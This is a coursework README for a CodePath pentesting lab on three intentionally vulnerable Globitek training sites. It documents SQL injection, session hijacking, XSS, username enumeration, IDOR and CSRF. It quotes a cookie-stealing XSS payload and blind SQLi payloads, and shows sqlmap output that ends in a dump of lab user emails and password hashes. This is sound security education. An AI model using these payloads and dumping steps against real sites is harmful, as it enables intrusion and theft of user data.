# codepath-week-8
Facebook Codepath CyberSecurity coursework

# Project 8 - Pentesting Live Targets

Time spent: **10** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection

Steps to reproduce:
* Open "Blue" Globitek site
* Click the "Find a Salesperson" link
* Select any salesperson
* Notice website presents a php with a query, for example `<url>/salesperson.php?id=4`
* Appent a `'` character to the end and reload the page
* Error message "Database Query Failed" results, so SQL query is not sanitized and is vulnerable
<img src="Blue 1 - SQL Injection.gif" width="800">

Vulnerability #2: Session Hijacking

It's worth mentioning that all sites(?) seem to be vulnerable to this.

Steps to reproduce:
* Open "Blue" Globitek site
* Click "Login" and provide user credentials
* Open a new tab and access `<url>/public/hacktools/change_session_id.php`
* Copy current session info to clipboard
* Open a private browser and navigate to `<url>/public/hacktools/change_session_id.php`
* Paste session informat and click "Change"
* Go back to login page in private browser window, notice that you're already logged in
<img src="Blue 2 - Session Hijack.gif" width="800">

## Green

Vulnerability #1: Cross Site Scripting

Steps to reproduce:
* Open "Green" Globitek site
* On "Public Site" select "Contact"
* Provide a fake username and fake email
* In the "Feedback" body, paste `<script>alert(document.cookie)</script>`
* Click "Submit"
* Login as pperson and go to Staff Menu -> Feedback
* Notice popup revealing that the XSS vulnerability is triggered
* Note that this did not work on the other colors - the other sites transformed the needed `<` and `>` characters
<img src="Green 1 - XSS.gif" width="800">

Vulnerability #2: Username Enumeration

Steps to reproduce:
* Open "Green" Globitek site
* Click "Login"
* Use a random character username and password combination
* Notice the `Log in was unsuccessful` result
* Try again, this time use a known user account "pperson" with an incorrect password
* Notice the `Log in was unsuccessful` result, which is now bold
<img src="Green 2 - Username Enumeration.gif" width="800">

## Red

Vulnerability #1: IDOR (Insecure Direct Object Reference)

Steps to reproduce:
* Open "Red" Globitek site
* Click the "Find a Salesperson" link
* Notice that the salesperson links all end in `<url>/salesperson.php?id=X` with X being a number from 1-9
* Change this number to 10 and reveal an account that should not be made public
<img src="Red 1 - IDOR.gif" width="800">

Vulnerability #2: CSRF

Steps to reproduce:
* Open "Red" Globitek site
* Login and click on "Staff Menu" -> "Users" and "Edit" a user
* Inspect the page element and change the value of `csrf_token` to something arbitrary
* Change an aspect of the user account, for example the Name
* Click "Update" and notice that the user account was changed in spite of the incorrect CSRF token
* The other sites validated the CSRF token and prevented tampering with the incorrect token
<img src="Red 2 - CSRF.gif" width="800">



## Notes

I didn't use any tools to do this aside from googling various attack testing vectors on the open internet. Most of my testing was trial and error. I'm not sure what I could do with most of these exploits, other than prove that they exist. I do plan to use sqlmap to expand on the SQLI vulnerability and will share my notes below if I discover anything.

## Bonus

I used sqlmap to try to expand a bit on the SQLI vulnerability. I used it to attack the Blue site, since the `id` parameter being passed was identified as a vulnerability. The results are as follows:
```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 9112=9112 AND 'pmxf'='pmxf

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (comment)
    Payload: id=1' OR SLEEP(5)#
---
[21:21:32] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[21:21:32] [INFO] fetching database names
[21:21:32] [INFO] fetching number of databases
[21:21:32] [INFO] retrieved: 7
[21:21:36] [INFO] retrieving the length of query output
[21:21:36] [INFO] retrieved: 18
[21:21:57] [INFO] retrieved: information_schema
[21:21:57] [INFO] retrieving the length of query output
[21:21:57] [INFO] retrieved: 13
[21:22:14] [INFO] retrieved: globitek_blue
[21:22:14] [INFO] retrieving the length of query output
[21:22:14] [INFO] retrieved: 14
[21:22:31] [INFO] retrieved: globitek_green
[21:22:31] [INFO] retrieving the length of query output
[21:22:31] [INFO] retrieved: 12
[21:22:47] [INFO] retrieved: globitek_red
[21:22:47] [INFO] retrieving the length of query output
[21:22:47] [INFO] retrieved: 5
[21:22:56] [INFO] retrieved: mysql
[21:22:56] [INFO] retrieving the length of query output
[21:22:56] [INFO] retrieved: 18
[21:23:17] [INFO] retrieved: performance_schema
[21:23:17] [INFO] retrieving the length of query output
[21:23:17] [INFO] retrieved: 3
[21:23:23] [INFO] retrieved: sys
available databases [7]:
[*] globitek_blue
[*] globitek_green
[*] globitek_red
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```
I then delved into the `globitek_blue` database and found the following:
```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 9112=9112 AND 'pmxf'='pmxf

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (comment)
    Payload: id=1' OR SLEEP(5)#
---
[21:33:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 (xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.0.12
[21:33:29] [INFO] fetching tables for database: 'globitek_blue'
[21:33:29] [INFO] fetching number of tables for database 'globitek_blue'
[21:33:29] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[21:33:29] [INFO] retrieved:
sqlmap got a 302 redirect to 'https://35.225.94.156:443/blue/public/territories.php'. Do you want to follow? [Y/n]
8
[21:33:34] [INFO] retrieved: countries
[21:33:52] [INFO] retrieved: failed_logins
[21:34:19] [INFO] retrieved: feedback
[21:34:36] [INFO] retrieved: salespeople
[21:34:58] [INFO] retrieved: salespeople_territories
[21:35:24] [INFO] retrieved: states
[21:35:36] [INFO] retrieved: territories
[21:35:59] [INFO] retrieved: users
Database: globitek_blue
[8 tables]
+-------------------------+
| countries               |
| failed_logins           |
| feedback                |
| salespeople             |
| salespeople_territories |
| states                  |
| territories             |
| users                   |
+-------------------------+
```
I then investigated the `users` table and came up with:
```
Table: users
[7 columns]
+-----------------+--------------+
| Column          | Type         |
+-----------------+--------------+
| created_at      | datetime     |
| email           | varchar(255) |
| first_name      | varchar(255) |
| hashed_password | varchar(255) |
| id              | int(11)      |
| last_name       | varchar(255) |
| username        | varchar(255) |
+-----------------+--------------+
```
I dumped the db and have the following three user accounts as a result:
|                                                                                                                              | 
|------------------------------------------------------------------------------------------------------------------------------| 
| id,email,username,last_name,created_at,first_name,hashed_password                                                            | 
| 1,test@test.com,jmonroe99,Munroe,NULL,Jim,$2y$11$Co5fHvH5Lgk2Zu0iHR46BO6fnqQt1pUljPbZOhk7bTU6hQFhjBJG.                       | 
| 2,lbt2000@nowhere.com,lbtables,Tables,2016-06-03 19:33:54,Bobby,$2y$10$I.Jwfc8R3xaFwlAlPn5U3OLAQXrE0c2fakN8rR4j2TW0gRVMd6U6a | 
| 3,person@nowhere.com,pperson,Person,2017-01-01 02:50:26,Pat,$2y$11$FHZQn1eWZ3mbn11evb3CSeM20LCsJZI8yP9wS/UsOI6VWnx.7mKDa     | 
